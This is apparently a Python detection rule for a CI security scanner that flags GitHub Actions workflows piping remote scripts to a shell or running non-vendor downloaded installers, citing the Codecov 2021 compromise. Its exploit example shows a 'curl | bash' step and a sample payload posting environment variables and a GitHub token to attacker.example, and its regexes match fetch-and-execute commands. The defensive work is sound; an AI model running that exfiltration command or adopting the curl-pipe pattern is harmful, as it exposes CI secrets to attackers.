"""GHA-016, remote script piped to shell interpreter."""
from __future__ import annotations

import re
from typing import Any

from ..._primitives import remote_script_exec
from ...base import Finding, Severity, blob_lower
from ...rule import Rule
from ..base import iter_jobs, iter_steps

RULE = Rule(
    id="GHA-016",
    title="Remote script piped to shell interpreter",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3",),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-494",),
    recommendation=(
        "Download the script to a file, verify its checksum, then "
        "execute it. Or vendor the script into the repository. For "
        "third-party installers (Codecov / similar), a SHA256 check "
        "+ GPG signature is NOT enough on its own — the Codecov 2021 "
        "incident shipped a malicious uploader that was signed by "
        "the publisher's own (compromised) CI pipeline. Pin the "
        "binary to an upstream-attested provenance reference "
        "(``slsa-verifier verify-artifact``, ``gh attestation "
        "verify``, ``cosign verify-attestation``) or pin a specific "
        "release digest, not just any signature."
    ),
    docs_note=(
        "Two shapes fire:\n\n"
        "1. **Curl-pipe.** ``curl | bash``, ``wget | sh``, and the "
        "shell-subshell / python-inline / download-exec / PowerShell "
        "variants documented in ``_primitives/remote_script_exec``. "
        "An attacker who controls the remote endpoint (or poisons "
        "DNS / CDN) gains arbitrary code execution in the CI runner.\n"
        "2. **Trusted-installer (Codecov 2021 shape).** A job "
        "downloads an executable from a non-vendor host (``curl -o``, "
        "``wget -O``, ``curl > file``) AND any subsequent step in "
        "the same job runs that file (``./file`` invocation or "
        "``chmod +x`` setup). Fires even when the body verifies a "
        "SHA256 checksum or GPG signature, because the original "
        "Codecov compromise modified the uploader BEFORE the "
        "publisher's CI signed it. The carve-out is an upstream-"
        "attested provenance reference in the same job: "
        "``slsa-verifier``, ``gh attestation verify``, or "
        "``cosign verify-attestation``. Vendor-allowlisted hosts "
        "(``rustup.rs``, ``get.docker.com``, etc.) are skipped here "
        "the same way the curl-pipe pass skips them."
    ),
    known_fp=(
        "Established vendor installers (get.docker.com, sh.rustup.rs, "
        "bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) "
        "ship via HTTPS from their own CDN and are idiomatic. This "
        "rule defaults to LOW confidence so CI gates can ignore them "
        "with --min-confidence MEDIUM; the finding still surfaces so "
        "teams that want cryptographic verification can audit.",
    ),
    incident_refs=(
        "[Codecov Bash uploader compromise](https://about.codecov.io/security-update/) "
        "(April 2021): an attacker modified the codecov.io/bash "
        "uploader script (commonly fetched via ``curl -s "
        "codecov.io/bash | bash``) to exfiltrate environment "
        "variables from CI runners (AWS keys, GitHub tokens, "
        "signing keys) at thousands of customers for over two "
        "months before discovery.",
        "[event-stream](https://github.com/dominictarr/event-stream/issues/116) "
        "(November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) "
        "(October 2021): npm-side examples of the same primitive. "
        "When the CI runner executes bytes a third party can swap out "
        "(via `curl | bash`, an unpinned `npm install`, or a "
        "compromised maintainer account), the attacker controls "
        "what runs with the runner's credentials in scope. Pinning a "
        "digest or vendoring a frozen copy turns a perpetual ambient "
        "risk into a one-time review.",
    ),
    exploit_example=(
        "# Vulnerable: install script piped straight to bash.\n"
        "steps:\n"
        "  - run: curl -sL https://example.com/install.sh | bash\n"
        "\n"
        "# Attack: an attacker who controls the install.sh endpoint\n"
        "# (compromised CDN, expired domain, BGP hijack, account\n"
        "# takeover, or simply being the upstream maintainer with bad\n"
        "# intent) drops a payload that runs in the CI runner with\n"
        "# every secret available to the job:\n"
        "#\n"
        "#   #!/usr/bin/env bash\n"
        "#   # legitimate-looking install actions...\n"
        "#   curl -X POST https://attacker.example/exfil \\\n"
        "#     -d \"$(env)\" -d \"$(cat $GITHUB_TOKEN_FILE 2>/dev/null)\"\n"
        "#\n"
        "# The runner has no way to know the bytes changed.\n"
        "\n"
        "# Safe: download, verify a known-good digest, then execute.\n"
        "steps:\n"
        "  - run: |\n"
        "      curl -sLo install.sh https://example.com/install.sh\n"
        "      echo \"abc123...expected_sha256  install.sh\" | sha256sum -c\n"
        "      bash install.sh"
    ),
)


# ── Trusted-installer (Codecov 2021) shape ───────────────────────────

# Any ``curl <url>`` / ``wget <url>`` on a line, regardless of where
# the URL sits in the argv. Catches ``curl -fLso codecov "https://..."``
# (combined flags), ``curl -o file URL``, ``wget URL -O file``, and
# the plain ``curl URL > file`` redirect. We do NOT require the
# ``-o`` flag specifically — any fetch lands in the trusted-installer
# bucket; the curl-pipe primitive scans for the ``| bash`` shape
# separately. Lines that ARE piped to a shell are filtered later via
# substring check.
_FETCH_TO_FILE_RE = re.compile(
    r"\b(?:curl|wget)\b[^\n]*?"
    r"(?P<url>https?://[^\s|;&'\">`]+)",
    re.IGNORECASE,
)

# ``chmod +x FILE`` (any permission spec containing ``x``) or
# ``./FILE`` invocation, or ``bash FILE`` / ``sh FILE`` / ``python FILE``.
# Capturing the file lets us tie back to the fetched file.
_EXECUTE_FILE_RE = re.compile(
    r"\bchmod\s+[+ugoa]*x[^\s]*\s+(?P<file>[A-Za-z0-9_./\-]+)"
    r"|(?:^|\s|;|&&|\|\|)\./(?P<dotfile>[A-Za-z0-9_./\-]+)"
    r"|\b(?:ba)?sh\s+(?!-c\b)(?P<shfile>[A-Za-z0-9_./\-]+\.sh)"
    r"|\bpython[23]?\s+(?P<pyfile>[A-Za-z0-9_./\-]+\.py)",
    re.IGNORECASE | re.MULTILINE,
)

# Provenance / attestation tools that defeat the Codecov shape. If
# any of these appears in the same job as the fetch+exec, the rule
# silent-passes the trusted-installer leg.
_PROVENANCE_TOOL_RE = re.compile(
    r"\b(?:"
    r"slsa-verifier\s+verify-artifact"
    r"|gh\s+attestation\s+verify"
    r"|cosign\s+verify(?:-attestation|-blob-attestation)?"
    r"|in-toto-(?:verify|attestation)"
    r")\b",
    re.IGNORECASE,
)


def _host_of(url: str) -> str:
    m = re.match(r"https?://([^/\s:?#]+)", url, re.IGNORECASE)
    return m.group(1).lower() if m else ""


def _find_trusted_installer_in_job(job: dict[str, Any]) -> str | None:
    """Return a short label when the job exhibits the trusted-installer
    shape (fetch-from-non-vendor + execute in same job, no provenance).

    The match is approximate by design: any fetch-to-file from a
    non-vendor host PLUS any execute primitive in the same job is
    enough, even if the rule can't statically prove the executed file
    is the same as the fetched file. The Codecov shape is exactly
    this primitive co-occurrence, and tightening to "same filename"
    would let `chmod +x ./binary` slip past when the fetch wrote to
    a different name first.
    """
    runs: list[str] = []
    for step in iter_steps(job):
        run = step.get("run")
        if isinstance(run, str):
            runs.append(run)
    if not runs:
        return None
    joined = "\n".join(runs)
    # Bail early if the job already exercises a provenance tool —
    # those workflows are doing the post-Codecov mitigation.
    if _PROVENANCE_TOOL_RE.search(joined):
        return None
    has_execute = bool(_EXECUTE_FILE_RE.search(joined))
    if not has_execute:
        return None
    for m in _FETCH_TO_FILE_RE.finditer(joined):
        url = m.group("url")
        if not url:
            continue
        host = _host_of(url)
        if not host or remote_script_exec._is_vendor(host):
            continue
        # Skip lines that are already a curl-pipe shape; those are
        # caught by the existing primitive and would double-count.
        line = joined[: m.end()].rsplit("\n", 1)[-1]
        line_full = line + joined[m.end() :].split("\n", 1)[0]
        if "|" in line_full and re.search(
            r"\|\s*(?:sudo\s+)?(?:(?:ba)?sh|python[23]?|perl|ruby)\b",
            line_full,
        ):
            continue
        return (
            f"non-vendor fetch ({host}) followed by execute, "
            f"no provenance attestation"
        )
    return None


def check(path: str, doc: dict[str, Any]) -> Finding:
    hits = remote_script_exec.scan(blob_lower(doc))
    job_offenders: list[str] = []
    for job_id, job in iter_jobs(doc):
        label = _find_trusted_installer_in_job(job)
        if label is not None:
            job_offenders.append(f"{job_id}: {label}")
    passed = not hits and not job_offenders
    if passed:
        desc = "No curl-pipe or trusted-installer patterns detected in this workflow."
    else:
        parts: list[str] = []
        if hits:
            parts.append(
                "Remote script piped to interpreter: "
                + ", ".join(h.snippet for h in hits[:3])
            )
        if job_offenders:
            parts.append(
                "Trusted-installer shape (Codecov 2021): "
                + "; ".join(job_offenders[:3])
            )
        desc = ". ".join(parts) + "."
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
